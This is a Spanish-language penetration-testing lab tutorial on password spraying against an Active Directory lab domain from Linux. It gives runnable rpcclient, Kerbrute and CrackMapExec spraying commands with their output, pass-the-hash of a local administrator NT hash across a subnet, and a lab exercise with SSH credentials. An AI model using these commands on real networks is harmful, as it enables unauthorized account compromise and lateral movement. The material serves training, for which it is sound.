
# Password Spraying Interno - Desde Linux

Ahora que hemos creado una lista de palabras usando uno de los métodos descritos en las secciones anteriores, es hora de ejecutar nuestro ataque. Las siguientes secciones nos permitirán practicar la pulverización de contraseñas desde hosts de Linux y Windows. Este es un enfoque clave para nosotros, ya que es una de las dos vías principales para obtener credenciales de dominio para el acceso, pero también debemos proceder con cautela.

***

## <mark style="color:purple;">Password Spraying Interno desde un host Linux</mark>

Una vez que hemos creado una lista de palabras utilizando uno de los métodos que se muestran en la sección anterior, es hora de ejecutar el ataque. `Rpcclient` es una excelente opción para realizar este ataque desde Linux. Una consideración importante es que un inicio de sesión válido no es inmediatamente evidente con `rpcclient`, y la respuesta `Authority Name` indica un inicio de sesión exitoso. Podemos filtrar los intentos de inicio de sesión no válidos con `grep` por `Authority` en la respuesta. La siguiente línea de Bash (adaptada de [aquí](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/) ) se puede utilizar para realizar el ataque.

### **Usando Bash One-Liner para el ataque**

```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

```shell-session
afsh4ck@kali$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

También podemos usar `Kerbrute` para el mismo ataque que comentamos anteriormente.

### **Usando Kerbrute para el ataque**

```shell-session
afsh4ck@kali$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
```

Existen muchos otros métodos para realizar la pulverización de contraseñas desde Linux. Otra gran opción es usar `CrackMapExec`. La herramienta, cada vez más versátil, acepta un archivo de texto de nombres de usuario para ejecutarlo con una única contraseña en un ataque de pulverización. Aquí buscamos filtrar con `grep` los errores de inicio de sesión y centrarnos solo en los intentos de inicio de sesión válidos (`+`) para asegurarnos de que no nos perdemos nada al desplazarnos por muchas líneas de salida.

### **Uso de CrackMapExec y filtrado de errores de inicio de sesión**

```shell-session
afsh4ck@kali$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
```

Después de recibir uno (o más) éxitos con nuestro ataque de pulverización de contraseñas, podemos usar `CrackMapExec` para validar las credenciales rápidamente contra un controlador de dominio.

### **Validando las Credenciales con CrackMapExec**

```shell-session
afsh4ck@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

***

## <mark style="color:purple;">Reutilización de contraseña de administrador local</mark>

La pulverización de contraseñas internas no sólo es posible con cuentas de usuario de dominio. Si obtiene acceso administrativo y el hash de contraseña NTLM o la contraseña de texto sin cifrar para la cuenta de administrador local (u otra cuenta local privilegiada), esto se puede intentar en varios hosts de la red. La reutilización de contraseñas de cuentas de administradores locales está muy extendida debido al uso de imágenes doradas en implementaciones automatizadas y a la aparente facilidad de administración al aplicar la misma contraseña en varios hosts.

CrackMapExec es una herramienta útil para intentar este ataque. Vale la pena apuntar a hosts de alto valor como servidores `SQL` o `Microsoft Exchange`, ya que es más probable que tengan un usuario con muchos privilegios conectado o que sus credenciales permanezcan en la memoria.

Al trabajar con cuentas de administrador local, una consideración es la reutilización de contraseñas o formatos de contraseña comunes entre cuentas. Si encontramos un host de escritorio con la contraseña de la cuenta de administrador local configurada en algo único como `$desktop%@admin123`, podría valer la pena probar la contraseña `$server%@admin123` con los servidores. Además, si encontramos cuentas de administrador local no estándar, como `bsmith`, podemos encontrar que la contraseña se reutiliza para una cuenta de usuario de dominio con un nombre similar. El mismo principio puede aplicarse a las cuentas de dominio. Si recuperamos la contraseña de un usuario llamado `ajones`, vale la pena probar la misma contraseña en su cuenta de administrador (si el usuario tiene una), por ejemplo, `ajones_adm` para ver si está reutilizando sus contraseñas. Esto también es común en situaciones de confianza de dominio. Podemos obtener credenciales válidas para un usuario en el `dominio A` que sean válidas para un usuario con el mismo nombre de usuario o uno similar en el `dominio B` o viceversa.

A veces, es posible que solo recuperemos el hash NTLM de la cuenta de administrador local de la base de datos SAM local. En estos casos, podemos distribuir el hash NT en una subred completa (o en varias subredes) para buscar cuentas de administrador local con la misma contraseña configurada. En el siguiente ejemplo, intentamos autenticarnos en todos los hosts de una red /23 utilizando el hash NT de la cuenta de administrador local integrado recuperado de otra máquina.&#x20;

La flag `--local-auth` le indicará a la herramienta que solo intente iniciar sesión una vez en cada máquina, lo que elimina cualquier riesgo de bloqueo de cuenta. `Asegúrese de que esta flag esté configurada para que no bloqueemos potencialmente al administrador del dominio`. De forma predeterminada, sin la opción de autenticación local configurada, la herramienta intentará autenticarse utilizando el dominio actual, lo que podría provocar rápidamente el bloqueo de la cuenta.

### **Pulverización de administrador local con CrackMapExec**

```shell-session
afsh4ck@hkali$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

El resultado anterior muestra que las credenciales eran válidas como administrador local en los `3` sistemas de la subred `172.16.5.0/23`. Luego, podemos enumerar cada sistema para ver si podemos encontrar algo que nos ayude a mejorar el acceso.

Esta técnica, aunque eficaz, es bastante ruidosa y no es una buena opción para evaluaciones que requieran sigilo. Siempre vale la pena buscar este problema durante las pruebas de penetración, incluso si no es parte de nuestro camino para comprometer el dominio, ya que es un problema común y debemos resaltarlo para nuestros clientes. Una forma de solucionar este problema es utilizar la herramienta gratuita de Microsoft [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899)  para que Active Directory administre las contraseñas de administrador local y aplique una contraseña única en cada host que rota en un intervalo establecido.

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.247.143 (ACADEMY-EA-ATTACK01)
Usuario " htb-student "
Contraseña " HTB_@cademy_stdnt! "
```

### Pregunta 1

Busque la cuenta de usuario que comienza con la letra "`s`" que tiene la contraseña `Welcome1`. Envíe el nombre de usuario como respuesta.

1. Vamos a usar `ldapsearch` para extraer una lista de usuarios del sistema

```
┌─[✗]─[htb-student@ea-attack01]─[~]
└──╼ $ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
guest
ACADEMY-EA-DC01$
ACADEMY-EA-MS01$
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch
ccruz
njohnson
mholliday
mshoemaker
aslater
kprentiss
gdavis
jmcdaniel
jjones
tgarcia
mharrison
nhight
wbaird
mochoa
jhopkins
hblea
cpennington
dglen
khartsfield
<------SNIP------>
```

2. Vamos a guardar estos usuarios en un archivo `users.txt`
3. Vamos a usar Kerbrute para hacer el Password Spray con la contraseña Welcome1

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 users.txt  Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 06/27/24 - Ronnie Flathers @ropnop

2024/06/27 13:22:00 >  Using KDC(s):
2024/06/27 13:22:00 >  	172.16.5.5:88

2024/06/27 13:22:00 >  [+] VALID LOGIN:	sgage@inlanefreight.local:Welcome1
2024/06/27 13:22:00 >  [!] ygroce@inlanefreight.local:Welcome1 - [Root cause: KDC_Error] KDC_Error: AS Exchange Error: kerberos error response from KDC: KRB Error: (14) KDC_ERR_ETYPE_NOSUPP KDC has no support for encryption type
2024/06/27 13:22:00 >  [!] bdavis@inlanefreight.local:Welcome1 - [Root cause: KDC_Error] KDC_Error: AS Exchange Error: kerberos error response from KDC: KRB Error: (14) KDC_ERR_ETYPE_NOSUPP KDC has no support for encryption type
```

Encontramos una cuenta válida: `sgage@inlanefreight.local`
